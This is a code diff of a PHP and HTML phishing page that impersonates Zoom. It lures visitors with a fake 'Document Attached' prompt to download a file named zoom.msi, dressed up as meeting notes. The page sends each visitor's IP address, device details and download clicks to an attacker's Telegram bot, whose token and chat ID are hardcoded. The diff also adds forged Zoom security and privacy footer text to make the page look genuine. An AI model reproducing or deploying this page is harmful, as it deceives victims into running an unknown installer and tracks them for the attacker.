@@ -1,39 +1,79 @@
 <?php
-// --- TELEGRAM NOTIFICATION LOGIC ---
-$botToken = "8335040883:AAFjauUz-K0KN8c9RthrrnJi8eQU-rN9a24";
-$chatId = "5835064705";
+// --- CONFIGURATION ---
+$telegramToken = '8335040883:AAFjauUz-K0KN8c9RthrrnJi8eQU-rN9a24';
+$chatId = '5835064705';
 
-// Gather visitor details
-$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
-$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
-$time = date('Y-m-d H:i:s');
-$page = "Zoom Document Landing Page";
+// --- GET REAL VISITOR IP (Handles Render Cloud Proxy) ---
+$ip = 'Unknown IP';
+if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+    $ip = trim($ipList[0]);
+} elseif (!empty($_SERVER['REMOTE_ADDR'])) {
+    $ip = $_SERVER['REMOTE_ADDR'];
+}
 
-// Simple IP location lookup (optional fallback)
-$geo = @json_decode(@file_get_contents("http://ip-api.com/json/{$ip}"), true);
-$location = ($geo && $geo['status'] == 'success') ? "{$geo['city']}, {$geo['country']}" : "Unknown Location";
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown Device';
 
-$msg = "<b>New Zoom Page Visit!</b>\n" .
-       "<b>IP:</b> {$ip}\n" .
-       "<b>Location:</b> {$location}\n" .
-       "<b>Time:</b> {$time}\n" .
-       "<b>Browser/Device:</b> {$userAgent}";
+// --- HANDLE DOWNLOAD CLICK EVENT ---
+if (isset($_GET['download']) && $_GET['download'] == '1') {
+    // Send separate Telegram notification for the download click
+    $downloadMessage = "🚨 **Zoom File Downloaded!**\n\n"
+                     . "🌐 **IP:** {$ip}\n"
+                     . "💻 **Device:** {$userAgent}\n"
+                     . "⏰ **Time:** " . date('Y-m-d H:i:s');
+    
+    $url = "https://api.telegram.org/bot{$telegramToken}/sendMessage";
+    $data = [
+        'chat_id' => $chatId,
+        'text' => $downloadMessage,
+        'parse_mode' => 'Markdown'
+    ];
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_exec($ch);
+    curl_close($ch);
 
-// Send alert to Telegram via cURL
-$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
-$data = [
-    'chat_id' => $chatId,
-    'text' => $msg,
-    'parse_mode' => 'HTML'
-];
+    // Serve the actual file download
+    $file = 'zoom.msi';
+    if (file_exists($file)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
+        header('Expires: 0');
+        header('Cache-Control: must-revalidate');
+        header('Pragma: public');
+        header('Content-Length: ' . filesize($file));
+        readfile($file);
+        exit;
+    }
+}
 
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $url);
-curl_setopt($ch, CURLOPT_POST, true);
-curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-@curl_exec($ch);
-@curl_close($ch);
+// --- SEND PAGE VISIT NOTIFICATION (Only on initial page load) ---
+if (!isset($_GET['download'])) {
+    $visitMessage = "New Zoom Page Visit!\n\n"
+                  . "IP: {$ip}\n"
+                  . "Location: Unknown Location\n"
+                  . "Time: " . date('Y-m-d H:i:s') . "\n"
+                  . "Browser/Device: {$userAgent}";
+    
+    $url = "https://api.telegram.org/bot{$telegramToken}/sendMessage";
+    $data = [
+        'chat_id' => $chatId,
+        'text' => $visitMessage
+    ];
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_exec($ch);
+    curl_close($ch);
+}
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -43,127 +83,135 @@ curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     <title>Zoom Document Cloud</title>
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-            background-color: #f7f9fa;
-            color: #232333;
+            font-family: Arial, sans-serif;
+            background-color: #f4f6f9;
             margin: 0;
-            padding: 0;
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
-        }
-        header {
-            padding: 20px 40px;
-            background: #ffffff;
-            border-bottom: 1px solid #e5e8eb;
-        }
-        .zoom-logo {
-            font-size: 24px;
-            font-weight: bold;
-            color: #0b5cff;
-            text-decoration: none;
-        }
-        .container {
-            flex: 1;
+            padding: 20px;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            min-height: 100vh;
+            box-sizing: border-box;
         }
-        .card {
-            background: #ffffff;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
-            max-width: 450px;
+        .wrapper {
+            max-width: 440px;
             width: 100%;
             text-align: center;
-            border: 1px solid #e5e8eb;
         }
-        h2 {
-            font-size: 20px;
-            font-weight: 600;
-            margin-bottom: 8px;
-            color: #131619;
+        .container {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+            margin-bottom: 20px;
+            box-sizing: border-box;
         }
-        .subtitle {
-            font-size: 14px;
-            color: #747487;
-            margin-bottom: 24px;
+        .zoom-logo {
+            font-size: 26px;
+            font-weight: bold;
+            color: #0b5cff;
+            margin-bottom: 20px;
         }
-        .doc-preview {
-            display: flex;
-            align-items: center;
-            background: #f0f4ff;
-            padding: 12px 16px;
+        .doc-box {
+            border: 1px solid #e1e4e8;
             border-radius: 6px;
-            margin-bottom: 24px;
-            border-left: 4px solid #0b5cff;
+            padding: 20px;
+            margin-bottom: 20px;
             text-align: left;
         }
-        .doc-info {
-            font-size: 14px;
-            font-weight: 500;
-            color: #131619;
+        .doc-title {
+            font-weight: bold;
+            font-size: 15px;
+            color: #333;
+            margin-bottom: 5px;
+            text-align: center;
         }
-        .doc-sub {
+        .doc-subtitle {
             font-size: 12px;
-            color: #747487;
+            color: #666;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        .info-bar {
+            background: #f0f4ff;
+            border-radius: 4px;
+            padding: 10px;
+            font-size: 12px;
+            color: #0b5cff;
+            margin-bottom: 15px;
         }
         .download-btn {
             display: block;
             width: 100%;
             background-color: #0b5cff;
             color: white;
-            padding: 12px 0;
-            border-radius: 6px;
+            padding: 12px;
+            border-radius: 4px;
             text-decoration: none;
-            font-weight: 600;
-            font-size: 15px;
-            transition: background-color 0.2s;
+            font-weight: bold;
+            text-align: center;
             box-sizing: border-box;
-            border: none;
-            cursor: pointer;
+            transition: background 0.2s;
         }
         .download-btn:hover {
-            background-color: #0045cc;
+            background-color: #0043ce;
         }
-        footer {
-            text-align: center;
-            padding: 20px;
-            font-size: 12px;
-            color: #747487;
-            border-top: 1px solid #e5e8eb;
+        .security-footer {
+            font-size: 11px;
+            color: #666;
+            line-height: 1.5;
+            text-align: left;
             background: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.04);
+        }
+        .security-footer p {
+            margin: 0 0 10px 0;
+        }
+        .security-footer p:last-child {
+            margin-bottom: 0;
+        }
+        .security-footer a {
+            color: #0b5cff;
+            text-align: none;
         }
     </style>
 </head>
 <body>
 
-    <header>
-        <a href="#" class="zoom-logo">Zoom</a>
-    </header>
+    <div class="wrapper">
+        <div class="container">
+            <!-- Zoom Logo Centered at Top -->
+            <div class="zoom-logo">Zoom</div>
 
-    <div class="container">
-        <div class="card">
-            <h2>Document Attached</h2>
-            <div class="subtitle">Zoom Document Cloud</div>
-            
-            <div class="doc-preview">
-                <div>
-                    <div class="doc-info">Click here to join meeting notes</div>
-                    <div class="doc-sub">Prepared by Accounts</div>
+            <div class="doc-box">
+                <div class="doc-title">Document Attached</div>
+                <div class="doc-subtitle">Zoom Document Cloud</div>
+                
+                <div class="info-bar">
+                    Click here to join meeting notes<br>
+                    <span style="font-size: 10px; color: #555;">Prepared by Accounts</span>
                 </div>
+
+                <!-- Triggers download and notifies Telegram simultaneously -->
+                <a href="?download=1" class="download-btn">View Document</a>
             </div>
 
-            <!-- Triggers zoom.msi download -->
-            <a href="zoom.msi" class="download-btn" download>View Document</a>
+            <div style="font-size: 11px; color: #888;">
+                Zoom, Copyright 2026 All Rights Reserved.
+            </div>
+        </div>
+
+        <!-- Security Notice & Footer requested directly below -->
+        <div class="security-footer">
+            <p>For your security, Zoom sends emails only from the following email addresses: <a href="https://zoom.us" target="_blank">zoom@zoom.us</a>, <a href="https://zoom.us" target="_blank">zoom@accounts.zoom.us</a>, and <a href="https://zoom.us" target="_blank">support@email.zoom.us</a>. Be cautious of emails from other addresses claiming to be us. If you suspect this email violates Zoom's Terms of Service, help protect our community and report abuse.</p>
+            
+            <p>To guarantee that you never miss a Zoom invitation or greeting card, please add <a href="https://zoom.us" target="_blank">zoom@zoom.us</a> to your address book and drag emails to your primary inbox if they land in "Spam" or "Promotions." If you want to stop receiving emails from Zoom, you can block a specific sender or unsubscribe to stop receiving all event invitations, greeting cards, and marketing emails sent via Zoom. Learn more about our <a href="https://zoom.us/privacy" target="_blank">Privacy Policy</a>.</p>
+            
+            <p style="margin-top: 15px; font-weight: bold; text-align: center;">© Zoom Post • 115 Broadway, New York, NY 10006</p>
         </div>
     </div>
-
-    <footer>
-        Zoom. Copyright 2026 All Rights Reserved.
-    </footer>
 
 </body>
 </html>
